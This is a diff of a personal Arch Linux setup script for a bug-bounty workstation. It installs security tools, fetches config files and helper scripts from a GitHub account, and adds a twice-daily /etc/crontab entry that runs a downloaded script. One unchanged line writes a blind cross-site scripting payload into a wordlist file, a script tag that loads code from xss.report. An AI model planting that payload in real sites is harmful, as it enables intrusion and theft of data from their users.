@@ -42,16 +42,21 @@ elif [ "$OS" == "arch" ]; then
 
     # Create all directories at once
     log "Creating directory structure..."
-    mkdir -p ~/tools ~/scripts/system ~/wordlists/payloads ~/bounty ~/.gf ~/.config/puredns ~/Notes ~/Dev ~/Work ~/Misc ~/nuclei-templates ~/oty-templates ~/.config/VSCodium/User ~/.var/app/org.torproject.torbrowser-launcher/data/torbrowser/tbb/x86_64/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/
+    mkdir -p ~/tools ~/scripts ~/wordlists/payloads ~/bounty ~/.gf ~/.config/puredns ~/Notes ~/Dev ~/Work ~/Misc ~/sys-scripts ~/nuclei-templates ~/oty-templates ~/.config/VSCodium/User ~/.var/app/org.torproject.torbrowser-launcher/data/torbrowser/tbb/x86_64/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/
 
     # Install core development tools in batch
     log "Installing core development packages..."
     sudo pacman -S --needed --noconfirm \
-        python3 rust python-pipx cmake docker docker-compose \
+        python3 python-pip rust python-pipx cmake docker docker-compose \
         flatpak wget ripgrep jq nmap btop fzf openbsd-netcat \
         tor yubikey-personalization libfido2 yubikey-manager \
-        binwalk findomain radare2 hashcat ghidra-desktop || \
+        binwalk findomain radare2 hashcat ghidra go stow \
+        cronie || \
         error "Failed to install core packages"
+
+    # Enable services
+    log "Enabling services..."
+    sudo systemctl enable --now cronie.service
 
     # Install GUI applications in batch
     log "Installing GUI applications..."
@@ -171,9 +176,10 @@ elif [ "$OS" == "arch" ]; then
     log "Downloading configurations..."
     {
         wget -q -O ~/.config/VSCodium/User/settings.json https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/settings.json &
-        wget -q -O ~/scripts/system/yubikey.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/yubikey.sh &
+        wget -q -O ~/sys-scripts/yubikey.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/yubikey.sh &
         wget -q -O ~/.config/puredns/resolvers.txt https://raw.githubusercontent.com/trickest/resolvers/refs/heads/main/resolvers.txt &
         wget -q -O ~/tools/chaos-programs.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/chaos-programs.sh &
+        wget -q -O ~/sys-scripts/rand-serv.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/rand-serv.sh &
         wait
     } || warn "Some downloads failed"
 
@@ -239,10 +245,38 @@ elif [ "$OS" == "arch" ]; then
     # Create custom payload
     echo "'\"<script src=https://xss.report/c/manwithafish></script>" > ~/wordlists/payloads/bxss.txt
 
+    # Function to set up cron job
+setup_cron() {
+    # Get current username
+    CURRENT_USER=$(whoami)
+
+    # Check if script is already in crontab
+    if sudo grep -q "rand-serv.sh" /etc/crontab 2>/dev/null; then
+        echo "Cron job already exists in /etc/crontab"
+        return 0
+    fi
+
+    # Add cron job for daily execution at noon
+    echo "0 10,16 * * * $CURRENT_USER ~/sys-scripts/rand-serv.sh" | sudo tee -a /etc/crontab > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "Successfully added to /etc/crontab"
+        echo "Will initiate twice daily at 10 AM and 4 PM with random execution timing"
+    else
+        echo "Failed to add to /etc/crontab - please run with sudo or check permissions"
+        return 1
+    fi
+}
+
+# Setup cron if this is the first run
+if [ "$1" != "--no-cron" ]; then
+    setup_cron
+fi
+
     # Cleanup and final setup
     log "Cleaning up..."
     rm -f /tmp/go.tar.gz
-    chmod +x ~/scripts/system/yubikey.sh ~/tools/chaos-programs.sh
+    chmod +x ~/sys-scripts/yubikey.sh ~/tools/chaos-programs.sh
 
     log "Arch Linux setup completed successfully!"
     log "Run 'source ~/.bashrc' to use all installed tools."
